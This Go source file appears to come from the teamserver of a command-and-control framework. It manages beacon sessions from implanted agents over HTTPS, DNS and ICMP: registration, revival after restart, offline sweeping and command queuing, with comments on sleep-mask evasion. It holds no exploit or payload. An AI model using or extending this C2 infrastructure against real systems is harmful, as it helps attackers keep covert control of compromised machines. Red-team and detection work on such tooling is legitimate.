// beacon 通道(HTTPS/DNS/ICMP)会话入口: 无长连接, 每次请求是一次独立事务。
// 逻辑会话在 Manager 表中跨请求存活; 身份由载荷内 machine_id/session_id 承载, 与 TCP 共用注册/复用/命令/响应匹配。
package session

import (
	"encoding/json"
	"time"

	"cleat/teamserver/internal/eventbus"
	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/store"
)

// BeaconOfflineAfter beacon 会话判离线的静默阈值:
// beacon 空闲节拍默认 60s(Agent HeartbeatPolicy base), 连续数拍无任何 GET/POST
// 即视为停拍离线。曾完全没有离线路径 → Closed 永远 false → CleanupExpired
// 永不回收 → 内存与库随会话数单调膨胀。
// 3m → 5m: 睡眠掩码部署下窗长=心跳节拍(cap 120s),
// 相邻顶格窗连续排列时 check-in 间隔可自然达到 ~4 分钟(实测最大 123s 间隔,
// 但"标记离线→秒级复活"曾在 3m 阈值下误触发 3 次) —— 5m 覆盖"两窗连排+抖动",
// 仍保留停拍回收能力。
const BeaconOfflineAfter = 5 * time.Minute

// SweepStaleBeacons 把停拍超过 BeaconOfflineAfter 的 beacon 会话标记离线并移出会话表。
// 由清理 sweeper 周期调用(与 CleanupExpired 同节奏): 标离线后 Closed=true,
// 记录进入 CleanupExpired(30min cutoff) 的可回收范围。TCP 会话不受影响 ——
// 其离线由 runLoop 读错误驱动, 这里只碰 IsBeacon() 会话。
// 返回本轮标记数(诊断用)。
func (m *Manager) SweepStaleBeacons() int {
	var candidates []*Session
	m.mu.RLock()
	for _, s := range m.sessions {
		if !s.IsBeacon() {
			continue
		}
		s.Record.Lock()
		stale := !s.Record.Closed && time.Since(s.Record.LastSeen) > BeaconOfflineAfter
		s.Record.Unlock()
		if stale {
			candidates = append(candidates, s)
		}
	}
	m.mu.RUnlock()
	n := 0
	for _, s := range candidates {
		// 复查避免 TOCTOU: 候选收集与执行之间 Agent 可能已回来(bindRevivedRecord
		// 置 Closed=false 并 Touch)。极小窗口内的漏判代价 = 误标离线, 下次 GET
		// 走复活路径自愈并重播上线事件, 可接受。
		s.Record.Lock()
		still := !s.Record.Closed && time.Since(s.Record.LastSeen) > BeaconOfflineAfter
		s.Record.Unlock()
		if !still {
			continue
		}
		logx.Printf("[-] beacon 会话 #%d 静默超 %s, 标记离线\n", s.ID(), BeaconOfflineAfter)
		s.MarkOffline()
		m.removeSessionMap(s.ID())
		n++
	}
	return n
}

// NewBeaconSession 创建一个 beacon 通道会话(无 Conn, 出站帧进 outbox; RemoteIP 来自请求)).
// transport 为可选通道类型("https"/"http"/"dns"/"icmp"): 省略时按 "https" 兜底。
func (m *Manager) NewBeaconSession(remoteIP string, transport ...string) *Session {
	sess := New(nil, m.bus)
	sess.MarkBeacon()
	sess.Record.RemoteIP = remoteIP
	sess.Record.Transport = transportOrDefault(transport, "https")
	return sess
}

// HandleBeaconFrame 处理一次 beacon 请求携带的一帧(密文解开后的明文载荷)。
// 与 TCP 的 runLoop 单帧处理共用 handleOne: 身份解析/复用/分发/poll 队列/响应匹配全部复用。
// 返回本次事务的最终会话(beacon 下即逻辑会话, 供调用方取 outbox 命令帧)。
func (m *Manager) HandleBeaconFrame(s *Session, body []byte) (*Session, error) {
	next, _ := s.handleOne(body, m)
	// 复用场景: 若 switch 到旧会话, 用旧会话继续(其 outbox 承载待拉取命令)。
	return next, nil
}

// BeaconFrame 是 beacon listener 的会话路由入口: 按帧内携带的 session_id 路由到持久会话;
// 无 session_id(首连 FirstConnect)时才建临时会话走身份注册。
//
// **未知 sid 绝不铸造会话**:
// `Manager.sessions` 只是**内存**表(`NewManager` 建空 map, 启动时不从 store 回填), 故服务端每次
// 重启后它对所有既有会话都是空的。旧实现把"内存里没有"直接当成"新注册"处理, 于是已注册 Agent 的
// **每一个在途请求**都落到 handleOne → ResolveIdentity 的非注册分支 → 铸造一个新会话
// (无 machine_id, 永不归并)并发上线事件 —— 实测: 断开→重启(正常)→再断开等一会→重启, 前端疯狂
// 刷新"未注册"消息, 差点打爆服务端。这与 #99→#113(混合帧 session_id 解析失败)同族: 都是
// **身份解析失败退化成了铸造**, 只是失败点从"解析"挪到了"查表"。
//
// 现在分两条恢复路径, 都不铸造:
// ① 内存无、持久记录在(服务端重启): 按记录**复活**会话(sid 不变), 重启对 Agent 透明;
// ② 内存无、记录也无: 回明确的"请重新注册"信号, 由 Agent 清空本地 sid 后带 machine_id 重发 FirstConnect。
//
// **注册帧不走 sid 路由**(见 isRegistrationFrame): FirstConnect 的身份在 machine_id, 它顶层的
// session_id 是 Agent 侧 FrameBuilder 无条件补的旧值。若照样按它路由, 重启后的重新注册会被
// 上面的"复活"截住 → 跳过身份解析 → 拿不到确认 → Agent 8s 确认超时 → 重连风暴(比原 bug 更糟)。
func (m *Manager) BeaconFrame(remoteIP string, sid int, body []byte, transport ...string) (*Session, error) {
	tr := transportOrDefault(transport, "https")
	// 入站限流: 超限静默丢弃, 返回 (nil, nil) 与
	// "TCP 冲突忽略本帧"同形态 —— 调用方(http/dns/icmp)跳过后续处理、回 200 空,
	// Agent 无感。绝不回错误码(重连风暴教训)。
	if !ingestAllowed(ingestKeyForFrame(sid, remoteIP), time.Now()) {
		return nil, nil
	}
	if sid > 0 && !isRegistrationFrame(body) {
		if old := m.sessionByID(sid); old != nil {
			if !old.IsBeacon() {
				// 旧代码会落到下方复活分支把 TCP 会话对象覆盖成 beacon 对象(会话错乱:
				// runLoop 读旧对象/命令写新对象)。此处只忽略本帧, 不得触碰 TCP 会话。
				// DNS/ICMP 调用方对 nil 返回已加防御。
				logx.Printf("[-] beacon POST sid=%d 冲突: 内存已有 TCP 活跃会话, 忽略本帧\n", sid)
				return nil, nil
			}
			next, _ := old.handleOne(body, m)
			return next, nil
		}
		// ① 服务端重启后内存表为空, 但持久记录仍在 -> 复活(保持 sid 不变)
		if rec := m.st.Get(sid); rec != nil {
			revived := m.bindRevivedRecord(New(nil, m.bus), rec, remoteIP, true, tr)
			if revived == nil {
				// 复活冲突(get-or-insert 发现并发占位/非 beacon 占位): 丢弃本帧
				return nil, nil
			}
			next, _ := revived.handleOne(body, m)
			return next, nil
		}
		// ② 记录也不在 -> 绝不按新注册处理(旧行为即匿名会话风暴的来源)
		logx.Printf("[-] beacon 未知会话 sid=%d 且无持久记录, 拒绝匿名注册, 下发重新注册信号\n", sid)
		return m.newSessionUnknownHint(remoteIP, sid), nil
	}
	s := m.NewBeaconSession(remoteIP, tr)
	return m.HandleBeaconFrame(s, body)
}

// BeaconGet 处理 beacon GET 取件请求(节拍合一/S2): 身份块已由 listener 解出并验签,
// 这里只负责会话侧语义。返回本次响应帧(可能为空 = 无帧; 未知会话时为"重新注册"信号帧)。
//
// 两条路径( 两态身份, 锁死  镜像坑 —— 认领失败绝不新建):
//   - machineID 非空: 按 machine_id 认领(claimByMachine), 认领成功即 confirm 入 outbox
//     (Agent 由此拿 sid —— POST 变纯上行后, 注册确认只能走 GET, 见 承重结构);
//   - 否则 sid > 0:   按 sid 路由(routeBySID, 含服务端重启后的持久复活);
//     完全未知 → reregisterFrame 经响应体带回(POST 纯上行后, 这类信号只能走 GET)。
//
// 取件顺序: Touch → compensate(离线任务补偿) → PollOutbox 队首单帧。
// confirm 在 compensate 之前入 outbox, FIFO 天然保证"注册确认先于后续命令"( 事故对偶面)。
func (m *Manager) BeaconGet(remoteIP, machineID string, sid int, transport ...string) []byte {
	tr := transportOrDefault(transport, "https")
	// 入站限流: 超限静默返回空 = "无帧"语义,
	// Agent 无感继续下一拍 —— 绝不回错误(重连风暴教训)。sid 未知时(mid 态)退 IP 键。
	if !ingestAllowed(ingestKeyForFrame(sid, remoteIP), time.Now()) {
		return nil
	}
	var s *Session
	if machineID != "" {
		s = m.claimByMachine(remoteIP, machineID, tr)
		if s == nil {
			return nil // 无记录可认领(新机器): 走 POST FirstConnect 注册路径
		}
	} else {
		var conflict bool
		s, conflict = m.routeBySID(remoteIP, sid, tr) // 注意: 赋值外层 s, 不得 := 遮蔽
		if s == nil {
			if conflict {
				// TCP 在线/复活冲突: **不发重注册**(发即误杀同机 TCP 会话身份)
				logx.Printf("[-] beacon GET sid=%d 存在非 beacon 活跃占位, 忽略本请求\n", sid)
				return nil
			}
			return reregisterFrame(sid)
		}
	}
	s.Touch()
	m.compensate(s)
	if f, ok := s.PollOutbox(); ok {
		return f
	}
	return nil
}

// claimByMachine 按 machine_id 认领既有会话(GET 身份块 mid 态)。**任何分支都不新建会话**。
//
// 三态:
//  1. 内存有且为活跃 beacon 会话: 复用其 outbox(原样), 补 confirm(Agent 无 sid 时唯一取 sid 途径);
//  2. 内存无: 按持久记录复活(bindRevivedRecord, sid 不变) + confirm;
//  3. 内存有但是 TCP 会话(或已关闭): 不认领 —— 混合通道冲突交给 POST 注册路径的
//     registerNew/machineID 复用语义处理(那里有 build_id 三元校验与防抖, GET 侧不应绕过)。
//
// 返回 nil 表示"无可认领"(新机器/冲突), 调用方按无帧处理, Agent 继续走 POST FirstConnect。
func (m *Manager) claimByMachine(remoteIP, machineID, transport string) *Session {
	rec := m.st.ByMachine(machineID)
	if rec == nil {
		return nil
	}
	if old := m.sessionByID(rec.ID); old != nil {
		if old.IsBeacon() && !old.Record.IsClosed() {
			// **不补 confirm**: POST 注册时的 confirm 已在 outbox
			// 队首, mid GET 必然取到 —— 无条件补发会造出第二个 confirm, Agent 在
			// Ready 态丢弃并刷 WARN(重复确认噪音)。outbox FIFO 天然保证 confirm 先于命令。
			old.Touch()
			return old
		}
		logx.Printf("[-] beacon GET machine_id 认领冲突: 会话 #%d 非 beacon 或已关闭, 交给 POST 注册路径\n", rec.ID)
		return nil
	}
	revived := m.bindRevivedRecord(New(nil, m.bus), rec, remoteIP, true, transport)
	if revived == nil {
		// 复活竞态冲突(get-or-insert 拒绝): 不补 confirm, 不取件 —— 交由后续请求重试
		logx.Printf("[-] beacon GET machine_id 认领复活冲突: #%d 已有占位\n", rec.ID)
		return nil
	}
	m.confirmSession(revived, rec.ID)
	return revived
}

// routeBySID 按 session_id 路由 GET 取件(身份块 sid 态), 语义与 BeaconFrame 的 sid 分支对齐:
// 内存有 → 直接用; 内存无但持久记录在 → 复活(服务端重启对 Agent 透明); 都无 → nil
// (调用方带回 reregisterFrame —— POST 纯上行后, 未知会话信号只能经 GET 带回)。
func (m *Manager) routeBySID(remoteIP string, sid int, transport string) (*Session, bool) {
	if old := m.sessionByID(sid); old != nil {
		if !old.IsBeacon() {
			return nil, true
		}
		old.Touch()
		return old, false
	}
	if rec := m.st.Get(sid); rec != nil {
		s := m.bindRevivedRecord(New(nil, m.bus), rec, remoteIP, true, transport)
		if s == nil {
			return nil, true // 复活冲突(get-or-insert 拒绝): 同上, 不发重注册
		}
		return s, false
	}
	return nil, false // 完全未知 → 调用方发重注册帧
}

// isRegistrationFrame 判断明文帧是否为注册帧(FirstConnect)。
//
// **为什么需要它**: FirstConnect 的身份由 `params.machine_id` 承载; 它顶层的 `session_id` 只是
// Agent 侧 `FrameBuilder` 给每帧无条件补上的**旧值**(注入不看命令类型), 对注册帧毫无意义。
// 而 beacon 路由是按顶层 session_id 做的 —— 若不加区分, 服务端重启后的重新注册会被按旧 sid
// 路由到"复活"路径, 从而**跳过身份解析**(handleOne 只在 Record.ID==0 时解析身份)、拿不到确认帧。
// 这正是"第一次重启(Agent 察觉断链→重新注册)正常"所依赖的路径, 不得被截断。
//
// TCP 侧本就没有这个问题: `ResolveIdentity` 只看 `cmd`, 从不读顶层 session_id —— 此处与之一致。
// 代价是多一次小载荷解析(beacon 请求频次低; handleOne 随后还会解析一次), 换来的是
// "注册/续连"两条路各自走各自的入口, 不靠隐式顺序。
// IsRegistrationFrame 导出包装(beacon/http.go 的注册确认死锁修复需要判别注册帧)。
func IsRegistrationFrame(frame []byte) bool { return isRegistrationFrame(frame) }

func isRegistrationFrame(frame []byte) bool {
	// 混合帧/纯 JSON 的形状判定统一走 SplitFrame(wire.go 单点), 只解析头
	header, _, err := SplitFrame(frame)
	if err != nil {
		return false
	}
	var m map[string]interface{}
	if err := json.Unmarshal(header, &m); err != nil {
		return false
	}
	cmd, _ := m["cmd"].(string)
	return cmd == CmdFirstConnect
}

// newSessionUnknownHint 构造一个**不入会话表**的临时 beacon 会话, 其 outbox 仅承载
// "会话未知, 请重新注册"信号 —— 由调用方(beacon listener)经响应体带回。
// 关键: 不走注册路径(不 NewBeaconSession/registerBrandNew), 故不铸造会话、不发上线事件。
func (m *Manager) newSessionUnknownHint(remoteIP string, sid int) *Session {
	s := New(nil, m.bus)
	s.MarkBeacon()
	s.Record.RemoteIP = remoteIP
	_ = s.sendFrame(reregisterFrame(sid))
	return s
}

// reregisterFrame 构造"请重新注册"控制帧。
// Agent 侧据 code=SESSION_UNKNOWN 清空本地 session_id, 并带 machine_id 重发 FirstConnect
// (服务端按 machine_id 复用既有记录, 见 registerNew)。
//
// **回带 sid**: 该字段是服务端**不认得**的那个会话 id(0 = 帧内本无 sid, 服务端无法路由)。
// Agent 用它做归属校验 —— 只对"就是自己当前 sid"的失效通知做重注册: 清身份前发出的
// 请求(如 Poll)可能带回迟到的失效通知, 若无此校验, 它会在重注册成功后又清掉**新**身份,
// 把链路拖进反复重注册(与 DENY_BUSY 的迟到拒绝同族, 见 SessionRunner 的注释)。
func reregisterFrame(sid int) []byte {
	body, _ := json.Marshal(map[string]interface{}{
		"status":     "error",
		"code":       "SESSION_UNKNOWN",
		"message":    "session unknown; re-register required",
		"session_id": sid,
	})
	return body
}

// bindRevivedRecord 把持久记录绑到(刚创建的)会话上并放入会话表 —— 服务端重启后内存表为空的
// 续连路径。**不改 ID/Info**: 就是原会话续命, sid 与主机信息一律保持不变。
//
// 能这样做的依据: handleOne 只在 `Record.ID == 0` 时才解析身份; 绑上记录(ID≠0)的会话直接走
// Dispatch, 无需重注册。beacon 通道传 beacon=true(出站帧进 outbox, 无 Conn)。
func (m *Manager) bindRevivedRecord(s *Session, rec *store.Record, remoteIP string, beacon bool, transport string) *Session {
	rec.Lock()
	wasClosed := rec.Closed
	rec.Closed = false
	rec.RemoteIP = remoteIP
	rec.LastSeen = time.Now()
	// 通道类型以本次连接为准(旧库记录可能缺 transport 或与当前通道不符)
	if transport != "" {
		rec.Transport = transport
	}
	rec.Unlock()

	kind := "TCP"
	if beacon {
		s.MarkBeacon()
		kind = "beacon"
	}
	s.Record = rec

	// **get-or-insert 原子化**:
	// 首版修复把"无条件插表"留在了前一句, 后面的锁内二次检查永远看到自己(dup)——
	// get-or-insert 实际失效, 会话错乱被原样 reintroduce。
	// **重构警告**: 本段必须且只能有一个插表点 = 下面锁内 else 分支。谁在锁外插表,
	// 谁就重新引入"并发互相覆盖 outbox/PendingResp"的会话错乱全家桶。
	m.mu.Lock()
	if existing, dup := m.sessions[rec.ID]; dup {
		m.mu.Unlock()
		if existing.IsBeacon() && !existing.Record.IsClosed() {
			existing.Touch()
			logx.Printf("[!] 会话 #%d 复活竞态: 内存已有活跃 beacon 对象, 复用之(丢弃本次新建)\n", rec.ID)
			return existing
		}
		logx.Printf("[-] 会话 #%d 复活冲突: 内存已有非 beacon/已关闭占位(TCP 在线?), 拒绝复活\n", rec.ID)
		return nil
	}
	m.sessions[rec.ID] = s
	m.mu.Unlock()
	m.st.Put(rec) // 复活即落盘(RemoteIP/LastSeen 已变)
	logx.Printf("[+] 会话 #%d 按持久记录复活(%s 续连, 服务端重启后) (%s)\n", rec.ID, kind, remoteIP)
	if wasClosed {
		// 仅"离线→回来"才播上线事件, 避免重启后对仍显示在线的会话重复刷事件
		m.bus.PublishGlobal(eventbus.NewEvent(eventbus.EventSessionOnline, rec.ID, s.Info()))
	}
	return s
}
